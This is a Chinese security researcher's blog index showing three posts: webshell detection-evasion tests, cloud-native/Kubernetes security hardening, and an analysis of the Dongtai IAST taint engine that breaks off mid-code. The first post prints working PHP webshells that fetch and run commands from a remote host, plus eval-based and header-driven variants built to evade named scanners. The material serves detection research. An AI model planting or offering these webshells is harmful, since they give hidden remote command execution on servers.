<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="leveryd的个人博客">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="leveryd的个人博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="leveryd">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://yoursite.com/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>leveryd的个人博客</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">leveryd的个人博客</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">leveryd</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">62</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-11-05-webshell%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-11-05-webshell%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/" class="post-title-link" itemprop="url">webshell绕过案例</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-11-05 10:56:03" itemprop="dateCreated datePublished" datetime="2022-11-05T10:56:03+08:00">2022-11-05</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-11-16 12:25:51" itemprop="dateModified" datetime="2022-11-16T12:25:51+08:00">2022-11-16</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在研究<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/UL7Rd56MtSB6If_Tu_2N7w">基于netfilter的后门</a>时，我想到如果webshell可以创建af_packet、af_netlink等socket，就可以不使用<code>$_POST</code>、<code>$_GET</code>等方式获取用户输入，因为某些webshell检测方式会标记<code>$_POST</code>、<code>$_GET</code>等数据为污点，所以这种方式可以用来躲避检测。</p>
<p>不过很遗憾，从 <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.socket-create.php">https://www.php.net/manual/en/function.socket-create.php</a> 文档中看，socket_create不支持创建af_netlink、af_packet类型的socket。</p>
<p>接着我又想到，我可以通过”端口复用”创建tcp服务来获取用户输入。比如和php-fpm、ssh服务做”端口复用”。</p>
<p>在 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/lab/search?searchtitle=lnmp">https://cloud.tencent.com/lab/search?searchtitle=lnmp</a> 的实验环境里搭了一个php-fpm环境后，测试后发现无法做端口复用，应该是php-fpm服务监听的socket没有用SO_REUSEPORT选项。测试代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/83038ce5b53a34435c9c0888235bf7bd">https://gist.github.com/leveryd/83038ce5b53a34435c9c0888235bf7bd</a></p>
<p>似乎上面两种思路都不行，最后我就想webshell能不能从远程获取用户输入呢，这样也不用<code>$_POST</code>、<code>$_GET</code>等变量。沿着这个思路构造了几个样本，并在<a target="_blank" rel="noopener" href="https://stack.chaitin.com/security-challenge/webshell/index">长亭的牧云</a>、<a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">百度的webdir</a>验证了一下检出效果。</p>
<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><p>第一个样本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd&#x3D;file_get_contents(&quot;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;cmd&quot;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>

<p>牧云标记出webshell，webdir没有检出。</p>
<p>即使改成下面这种用eval、字符串拼接，牧云也可以检出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&#39;$cmd&#x3D;file_get&#39;.&#39;_contents(&quot;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;cmd&quot;);&#39;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/200168952-48fa8873-82f4-4f56-84b6-fecf16493a2e.png"></p>
<p>不过加入随机数后，牧云就无法检出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function rand_char()&#123;</span><br><span class="line">        $s &#x3D; substr(str_shuffle(str_repeat(&quot;1t&quot;,1)), 0, 1); &#x2F;&#x2F; 从&quot;1&quot;和&quot;t&quot;中随机选择一个字符</span><br><span class="line">        return $s;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;rand_char();</span><br><span class="line">eval(&#39;$cmd&#x3D;file_ge&#39;.$r.&#39;_contents(&quot;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;cmd&quot;);&#39;);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/1846319/200169251-03184444-5820-4f0f-88ce-21b5739ec95a.png"></p>
<blockquote>
<p>rand、mt_rand 生成的随机数，牧云是可以检出的</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最开始的思路是想避免<code>$_POST</code>、<code>$_GET</code>等常见方式获取用户输入，最终绕过还是得靠不常见的随机数函数。</p>
<blockquote>
<p>file_get_contents也可以改成socket，代码见 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/896b9fba137aa2d12ce8c7737d451852">https://gist.github.com/leveryd/896b9fba137aa2d12ce8c7737d451852</a></p>
</blockquote>
<p>PS：<br>在研究过程中，发现一个似乎比较少见的获取header的api，测试发现也可以绕过webdir</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$headers&#x3D;apache_request_headers();</span><br><span class="line">eval($headers[&quot;X-TARGET&quot;]);</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-10-13-%E6%B5%85%E8%B0%88%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-10-13-%E6%B5%85%E8%B0%88%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/" class="post-title-link" itemprop="url">浅谈云原生安全建设</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-10-13 22:35:36" itemprop="dateCreated datePublished" datetime="2022-10-13T22:35:36+08:00">2022-10-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-11-16 12:26:01" itemprop="dateModified" datetime="2022-11-16T12:26:01+08:00">2022-11-16</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>我想总结一下我理解的云原生安全，内容源于我的工作经历、我看到的公开分享、最近面试时被问到的。</p>
<p>kubernetes官方提出”你可以分层去考虑安全性，云原生安全的4个C分别是云(Cloud)、集群(Cluster)、容器(Container)和代码(Code)”，我也是从这个”4c模型”来理解云原生安全的。</p>
<blockquote>
<p>kubernetes描述的4c模型 <a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/concepts/security/overview/">https://kubernetes.io/zh-cn/docs/concepts/security/overview/</a></p>
</blockquote>
<p>下面就向你介绍我用”4c模型”怎么理解云原生安全的，在每一层描述风险和对应的缓解措施。</p>
<h1 id="第一个C-代码-Code"><a href="#第一个C-代码-Code" class="headerlink" title="第一个C:代码(Code)"></a>第一个C:代码(Code)</h1><p><img src="https://user-images.githubusercontent.com/1846319/195636101-75c21d00-3156-4a2b-bbe6-f06fc90632be.png"></p>
<p>代码风险有两种，编码和第三方依赖，缓解这两种安全风险也有很多手段。</p>
<p>其中我觉得安全编码最重要的是在web框架提供统一的默认安全能力，就比如说orm框架预编译避免sql注入、react/vue等前端框架能将数据和代码分离来避免xss。通过检查业务代码有没有使用框架提供的不安全api来收敛风险。</p>
<h1 id="第二个C-容器-Container"><a href="#第二个C-容器-Container" class="headerlink" title="第二个C:容器(Container)"></a>第二个C:容器(Container)</h1><p><img src="https://user-images.githubusercontent.com/1846319/195657558-0d914e2b-babf-40b6-b860-199a53005d08.png"></p>
<p>kubernetes的命名空间并没有网络隔离的效果，默认情况下pod之间能互相访问、pod能访问宿主机、pod能访问vpc。当pod被getshell、pod服务存在ssrf漏洞时，就能攻击其他服务。</p>
<p>容器网络中也可以arp欺骗，有师傅分享过实战案例，可以见 <a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/tree/master/2019/25%E6%97%A5/%E9%92%88%E5%AF%B9Docker%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C%E7%9A%84ARP%E6%AC%BA%E9%AA%97%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.pdf">https://github.com/knownsec/KCon/tree/master/2019/25日/针对Docker容器网络的ARP欺骗与中间人攻击.pdf</a></p>
<p>镜像中的基础镜像、安装的软件有可能版本比较低，存在历史漏洞。这种风险不一定能变成漏洞利用，提供镜像的服务商可能更关注这类风险。风险更大的场景是镜像中存在研发运维留在镜像中的敏感信息，比如pod中的应用想要和云服务通信时需要有ak/sk来签名或者sts，所以反编译应用或者查看环境变量后能看到ak/sk或者sts。</p>
<h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><p>pod中的进程可以用/var/run/secrets/kubernetes.io/serviceaccount/token文件中的服务账号作为集群中的身份，这里的风险是token文件是明文存储的，并且也没有办法确保所有pod中的应用api都实现认证鉴权。</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98874541">Kubernetes 下零信任安全架构分析</a> 文章中提到蚂蚁k8s集群中api服务认证和授权的设计，在服务网格场景中，通过sidecar、pod label、证书或者jwt来在请求中带上身份信息、通过sidecar校验身份和授权。</p>
<blockquote>
<p>对于这个设计我有很多不明白的地方，比如 “在pod里curl其他应用，sidecar也会带上身份信息？这样不就相当于伪造身份了吗”。</p>
</blockquote>
<p>## 网络隔离</p>
<h3 id="风险是什么呢？"><a href="#风险是什么呢？" class="headerlink" title="风险是什么呢？"></a>风险是什么呢？</h3><p>网络隔离是我认为”投入产出比最高、优先级最高”的一个事情。</p>
<p>默认情况下，pod是可以访问”k8s集群网络”、”宿主机网络”:</p>
<ul>
<li>可以访问宿主机上的服务</li>
<li>可以访问”宿主机所在网络”的服务</li>
<li>可以访问集群service、pod，并且不受”kubernetes namespace”限制</li>
</ul>
<blockquote>
<p>kubernetes namespace不是内核的namespace，而是”项目”的概念。一个项目应该属于一个 kubernetes namespace。</p>
</blockquote>
<p>从pod攻击集群有很多手段，举两个例子。</p>
<p>如果集群部署在云虚机上，在容器中就可以访问特殊网段的”元数据服务”。在<a target="_blank" rel="noopener" href="https://www.4armed.com/blog/hacking-digitalocean-kubernetes/">18年黑掉DigitalOcean的k8s服务案例</a>中，攻击者通过metadata中的etcd凭证拿下k8s集群。在<a target="_blank" rel="noopener" href="https://hackerone.com/reports/341876">Shopify的hackerone报告</a>中，攻击者通过ssrf漏洞获取谷歌云metadata中的集群证书信息。</p>
<p>在容器中也可以攻击宿主机上的服务。举一个我以前报告的漏洞为例，通过”容器中挂载宿主机根目录到容器后写入ssh key，然后在容器中连接宿主机ssh”我逃逸到了宿主机。当时我想如果业务方”禁止容器访问宿主机ssh服务”，逃逸过程就会受影响。</p>
<blockquote>
<p>挂载宿主机目录后，也可以用static pod、cron服务来做攻击。怎么预防和发现这种利用手段是另外一个话题。</p>
</blockquote>
<p>攻击者也可以在容器中对vpc、内网、集群服务做漏洞扫描。更多的kubernetes下的攻击手法和案例可以阅读 <a target="_blank" rel="noopener" href="https://github.com/neargle/my-re0-k8s-security/">neargle大佬的总结</a></p>
<h3 id="怎么做网络隔离呢？"><a href="#怎么做网络隔离呢？" class="headerlink" title="怎么做网络隔离呢？"></a>怎么做网络隔离呢？</h3><p>一个比较常见的网络隔离效果如下:</p>
<p>对pod的限制:</p>
<ul>
<li>pod不能主动访问”宿主机所在的内网”</li>
<li>pod不能主动访问宿主机</li>
<li>pod不能主动访问虚机metadata</li>
<li>pod能主动访问外网</li>
<li>同一个”k8s namespace”下pod网络可以互通，不同”k8s namespace”下pod网络不通</li>
</ul>
<p>同时，不应该限制宿主机网络:</p>
<ul>
<li>node可以访问master</li>
<li>node可以访问外网</li>
</ul>
<p>kubernetes的<a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/network-policies/">NetworkPolicy</a> 并不能完全实现上面要求的网络隔离效果，因为它的默认策略是拒绝，用户只能加白。所以我们还需要借助其他的手段来做网络隔离，比如iptables。</p>
<p>一个简单的例子如下:在宿主机上执行下面的iptables (假设pod网段是10.233.69.0/24)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iptables -I OUTPUT -m state --state NEW -s 10.233.69.0&#x2F;24 -d 192.168.0.0&#x2F;16 -j DROP   &#x2F;&#x2F; pod不能主动访问&quot;宿主机所在的内网&quot;</span><br><span class="line">iptables -I OUTPUT -m state --state NEW -s 10.233.69.0&#x2F;24 -d 10.0.0.0&#x2F;8 -j DROP</span><br><span class="line">iptables -I OUTPUT -m state --state NEW -s 10.233.69.0&#x2F;24 -d 172.16.0.0&#x2F;12 -j DROP</span><br><span class="line"></span><br><span class="line">iptables -I OUTPUT -m state --state NEW -s 10.233.69.0&#x2F;24 -d 169.254.169.254&#x2F;32 -j DROP    &#x2F;&#x2F; pod不能主动访问metadata(华为云&#x2F;百度云&#x2F;amazon&#x2F;azure)</span><br><span class="line">iptables -I OUTPUT -m state --state NEW -s 10.233.69.0&#x2F;24 -d 100.100.100.200&#x2F;32 -j DROP    &#x2F;&#x2F; pod不能主动访问metadata(阿里云)</span><br><span class="line"></span><br><span class="line">iptables -I OUTPUT -d 10.233.69.0&#x2F;24 -j ACCEPT &#x2F;&#x2F; 容器网络加白</span><br><span class="line"></span><br><span class="line">iptables -I OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<h2 id="利用内核漏洞逃逸的检测和阻断"><a href="#利用内核漏洞逃逸的检测和阻断" class="headerlink" title="利用内核漏洞逃逸的检测和阻断"></a>利用内核漏洞逃逸的检测和阻断</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1981030">The Route to Host:从内核提权到容器逃逸</a> 提到多种利用内核漏洞做容器逃逸的手段，比如修改容器进程task_struct数据结构的nsproxy、cred字段，修改命名空间和capability。</p>
<p>有针对类似利用手法做检测的方案，比如 <a target="_blank" rel="noopener" href="https://github.com/lkrg-org/lkrg">lkrg</a>项目，检查进程cred等字段是否改变。</p>
<p><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-22/Wednesday/US-22-Fournier-Return-To-Sender.pdf">https://i.blackhat.com/USA-22/Wednesday/US-22-Fournier-Return-To-Sender.pdf</a> paper中提到针对内核漏洞rop利用手法，通过eBPF检查<code>commit_creds(prepare_kernel_cred(0))</code>函数调用栈中是否有来自用户态空间的地址，达到类似smep、smap的效果。</p>
<h2 id="镜像裁剪和运行时监控"><a href="#镜像裁剪和运行时监控" class="headerlink" title="镜像裁剪和运行时监控"></a>镜像裁剪和运行时监控</h2><p><a target="_blank" rel="noopener" href="https://containerjournal.com/features/sysdig-adds-ability-to-make-container-runtimes-immutable">https://containerjournal.com/features/sysdig-adds-ability-to-make-container-runtimes-immutable</a> 提到sysdig产品提供了一个能力，能让”容器只运行白名单程序”。  </p>
<p>在 <a target="_blank" rel="noopener" href="https://github.com/falcosecurity/falco/blob/35db0b4a24344bc6c24022555f7d8531ad925136/rules/falco_rules.yaml#L3018">https://github.com/falcosecurity/falco/blob/35db0b4a24344bc6c24022555f7d8531ad925136/rules/falco_rules.yaml#L3018</a> 可以看到规则。</p>
<p>包括两种告警策略:</p>
<ul>
<li>发现chmod时</li>
<li>发现open创建的文件有执行权限时</li>
</ul>
<p>如果一个镜像裁剪到只留下必要的可执行文件，再加上面的运行时监控，就能削减很大的攻击面、容易发现威胁。</p>
<h1 id="第三个C-集群"><a href="#第三个C-集群" class="headerlink" title="第三个C:集群"></a>第三个C:集群</h1><p><img src="https://user-images.githubusercontent.com/1846319/196645278-491603d6-5789-4631-8212-bc65d43596e3.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.infoq.cn/article/ycdctxabbgqjdfckiy0y">蚂蚁集团针对 K8s 中 Secret 安全防护的实践与探索</a> 中提到针对secret对象实施的数据安全方案，相比于只在etcd中加密secret，还保护了apiserver内存中没有secret。个人感觉大部分公司没有需求和动力做这个建设。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/kubernetes%E4%B8%AD%E7%9A%84%E5%BC%82%E5%B8%B8%E6%B4%BB%E5%8A%A8%E6%A3%80%E6%B5%8B.pdf">https://github.com/knownsec/KCon/blob/master/2021/kubernetes中的异常活动检测.pdf</a> paper中提到通过kubernetes的审计机制、创建蜜罐账号来发现集群中的攻击行为。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结了code、container、cluster三层的风险和缓解措施，对于其中我自己觉得比较重要或者有意思的部分内容做了多一点说明。</p>
<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/765449">kubernetes攻防矩阵</a> 也是一个做云原生安全检测产品、云安全建设值得参考的模型。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-09-29-%E6%B5%85%E6%9E%90%E6%B4%9E%E6%80%81iast%E4%BA%A7%E5%93%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022-09-29-%E6%B5%85%E6%9E%90%E6%B4%9E%E6%80%81iast%E4%BA%A7%E5%93%81/" class="post-title-link" itemprop="url">浅析洞态iast产品</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-09-29 23:04:23" itemprop="dateCreated datePublished" datetime="2022-09-29T23:04:23+08:00">2022-09-29</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-09-30 12:32:25" itemprop="dateModified" datetime="2022-09-30T12:32:25+08:00">2022-09-30</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前的工作中处理过一些<a target="_blank" rel="noopener" href="https://doc.dongtai.io/">洞态iast</a>的漏报误报案例,也逐渐了解这个项目。</p>
<p>本文记录我对洞态iast基本原理的理解,毕竟不记一下过段时间就忘了。</p>
<p>本文内容包括：</p>
<ul>
<li>洞态做漏洞检测的原理</li>
<li>洞态中的污点是什么</li>
<li>源码分析java-agent的业务逻辑</li>
<li>举个例子：洞态怎么检测mybatis写的sql是否存在sql注入</li>
</ul>
<h1 id="怎么做漏洞检测"><a href="#怎么做漏洞检测" class="headerlink" title="怎么做漏洞检测?"></a>怎么做漏洞检测?</h1><p><img src="https://user-images.githubusercontent.com/1846319/193180966-8b2815cf-a613-414e-a5e9-58c8259e0687.png"></p>
<p>如上，用户可以在server端配置四类规则：</p>
<ul>
<li>污点源方法：是获取api、rpc请求信息的接口或者类签名,比如<code>javax.servlet.ServletRequest.getParameter(java.lang.String)</code></li>
<li>传播方法：是字符串拼接、编码等接口或类签名,比如<code>java.lang.String.&lt;init&gt;(java.lang.String)</code></li>
<li>危险方法：是高危函数,比如<code>javax.naming.Context.lookup(java.lang.String)</code></li>
</ul>
<p>源码中有三个重要的数据结构,<code>TAINT_POOL</code>存放污点对象,<code>TAINT_HASH_CODES</code>存放污点对象的hashCode值,<code>TRACK_MAP</code>存放调用关系</p>
<p>当代码执行到被hook的传播方法时,会根据用户配置的”污点来源”规则,拿到对象(一般是函数的某个参数)去<code>TAINT_POOL</code>和<code>TAINT_HASH_CODES</code>搜索匹配。如果能匹配上,就会根据用户配置的”污点去向”规则,生成污点对象并放到<code>TAINT_POOL</code>中,并将污点对象的hashCodes存放到<code>TAINT_HASH_CODES</code>中,最后将传播方法的调用关系存放到<code>TRACK_MAP</code>。</p>
<p>当代码执行到被hook的危险方法时,和传播方法的逻辑比较类似,不过没有”污点去向”。</p>
<p>这里的”污点”是什么呢？</p>
<h1 id="污点是什么？"><a href="#污点是什么？" class="headerlink" title="污点是什么？"></a>污点是什么？</h1><p>最重要的概念是对象的hashcode/identifyHashCode,hashcode/identifyHashCode作为数据的唯一跟踪方法会被加入到污点池中,也会被用来判断是否在污点池中。</p>
<p>下面我带你通过一个我遇到过的误报案例来理解这个概念。</p>
<p>因为Java中相同字符串对象的hashcode/identifyHashCode是不变的,如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String a &#x3D; &quot;123&quot;;</span><br><span class="line">String b &#x3D; &quot;123&quot;;</span><br><span class="line">System.out.println(System.identityHashCode(a));   &#x2F;&#x2F; 1289696681</span><br><span class="line">System.out.println(System.identityHashCode(b));   &#x2F;&#x2F; 1289696681</span><br></pre></td></tr></table></figure>

<p>所以有时候即使危险函数的参数完全不可控,也会报警。如下代码中的iast17接口之前会误报(现已修复),因为iast会认为<code>f.getName()</code>返回的字符串对象<code>123</code>是污点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(&quot;&#x2F;iast17&quot;)</span><br><span class="line">public String iast17(@RequestParam(&quot;name&quot;) String name) &#123;</span><br><span class="line">    ArrayList&lt;String&gt; a &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">    a.add(&quot;123&quot;);</span><br><span class="line">    a.add(name);  &#x2F;&#x2F; a对象会被标记成污点</span><br><span class="line"></span><br><span class="line">    Iterator&lt;String&gt; b &#x3D; a.iterator();</span><br><span class="line">    System.out.println(b.next());</span><br><span class="line">    